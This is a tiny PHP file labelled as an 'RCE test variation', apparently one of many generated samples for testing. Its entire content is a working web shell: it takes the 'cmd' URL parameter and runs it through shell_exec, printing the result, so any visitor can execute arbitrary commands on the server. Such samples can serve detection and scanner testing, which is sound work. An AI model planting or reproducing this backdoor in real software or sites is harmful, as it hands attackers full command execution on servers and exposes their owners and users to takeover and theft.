<?php
// RCE test variation #1240
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>